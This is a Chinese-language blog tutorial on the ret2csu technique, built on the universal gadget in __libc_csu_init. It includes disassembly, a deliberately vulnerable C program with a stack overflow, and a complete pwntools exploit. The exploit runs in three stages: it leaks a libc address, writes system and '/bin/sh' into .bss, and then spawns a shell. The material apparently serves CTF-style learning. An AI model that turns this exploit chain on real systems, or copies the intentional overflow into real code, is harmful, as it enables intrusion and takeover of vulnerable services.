---
title: 通用gatget
date: 2018-08-21 18:05:20
tags:
---
构造通用rop
===========
```
it_array_end>
  4005b8:	4c 89 6c 24 e8       	mov    %r13,-0x18(%rsp)
  4005bd:	4c 89 74 24 f0       	mov    %r14,-0x10(%rsp)
  4005c2:	4c 89 7c 24 f8       	mov    %r15,-0x8(%rsp)
  4005c7:	48 89 5c 24 d0       	mov    %rbx,-0x30(%rsp)
  4005cc:	48 83 ec 38          	sub    $0x38,%rsp
  4005d0:	4c 29 e5             	sub    %r12,%rbp
  4005d3:	41 89 fd             	mov    %edi,%r13d
  4005d6:	49 89 f6             	mov    %rsi,%r14
  4005d9:	48 c1 fd 03          	sar    $0x3,%rbp
  4005dd:	49 89 d7             	mov    %rdx,%r15
  4005e0:	e8 1b fe ff ff       	callq  400400 <_init>
  4005e5:	48 85 ed             	test   %rbp,%rbp
  4005e8:	74 1c                	je     400606 <__libc_csu_init+0x66>
  4005ea:	31 db                	xor    %ebx,%ebx
  4005ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4005f0:	4c 89 fa             	mov    %r15,%rdx
  4005f3:	4c 89 f6             	mov    %r14,%rsi
  4005f6:	44 89 ef             	mov    %r13d,%edi
  4005f9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  4005fd:	48 83 c3 01          	add    $0x1,%rbx
  400601:	48 39 eb             	cmp    %rbp,%rbx
  400604:	75 ea                	jne    4005f0 <__libc_csu_init+0x50>
  400606:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
  40060b:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp
  400610:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12
  400615:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13
  40061a:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
  40061f:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
  400624:	48 83 c4 38          	add    $0x38,%rsp
  400628:	c3                   	retq   
  400629:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400630 <__libc_csu_fini>:
  400630:	f3 c3                	repz retq 
  
```
这里我们可以用0x400606处的赋值来构造跳板然后跳到0x4005f0位置处来实现赋值。
为什么要构造2个呢。寄存器的使用顺序是rdi,rsi,rdx使用这3个寄存器就能调用我们常用的函数write和read了。

祭出来栗子吧
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```
编译命令：
```
gcc -fno-stack-protector level3.c -o level3
```
不要陷入思维定式，我们的目的只是调用system("/bin/sh")用的手段就是想办法把调用system的时候刚好/bin/sh的地址在rdi里面。至于system和/bin/sh在哪存着只要不是在用到之前被覆盖就好。

精准控制参数让它实现1.传参并执行函数，2.跳转到main函数
```
from pwn import *
elf=ELF('./level5')
#context.log_level='debug'

mov_addr=0x400606
rdx_addr=0x4005f0
got_read=elf.got["read"]
got_write=elf.got["write"]
bss_addr=0x0000000000601028
main=0x0000000000400564
p=process("./level5")
print "********run 1************************"
p.recvuntil("Hello, World\n")
payload='A'*136+p64(mov_addr)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(1)+p64(got_write)+p64(8)+p64(rdx_addr)+'\x00'*56+p64(main)
p.send(payload)
write_addr = u64(p.recv(8))
print "address"+hex(write_addr)


libc=ELF("libc6_2.27-3ubuntu1_amd64.so")
system_addr=write_addr-libc.symbols["write"]+libc.symbols["system"]
print "system_addr="+ hex(system_addr)

print "********run 2*****************************"
p.recvuntil("Hello, World\n")
payload2='A'*136+p64(mov_addr)+p64(0)+p64(0)+p64(1)+p64(got_read)+p64(0)+p64(bss_addr)+p64(16)+p64(rdx_addr)+'A'*56+p64(main)
p.send(payload2)
print hex(bss_addr)


p.send(p64(system_addr))
p.send("/bin/sh\0")

print "****************Run 3*********************"
p.recvuntil("Hello, World\n")
payload3 =  "\x00"*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += "\x00"*56
payload3 += p64(main)

p.send(payload3)


p.interactive()
```
一定要有耐心。可能需要好多次才会成功
这里用了3次payload第一次实现了溢出泄漏libc版本。
第二次写入数据——向bss段中写入数据，第三次调用call。
要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）(用sendline也可以不过不能解决这个问题)


总结：传参可以直接的也可以是间接的，调用函数可以是发送一次payload也可以是发送几次payload,只要获取内存的写和执行权限一般情况下就能pwn






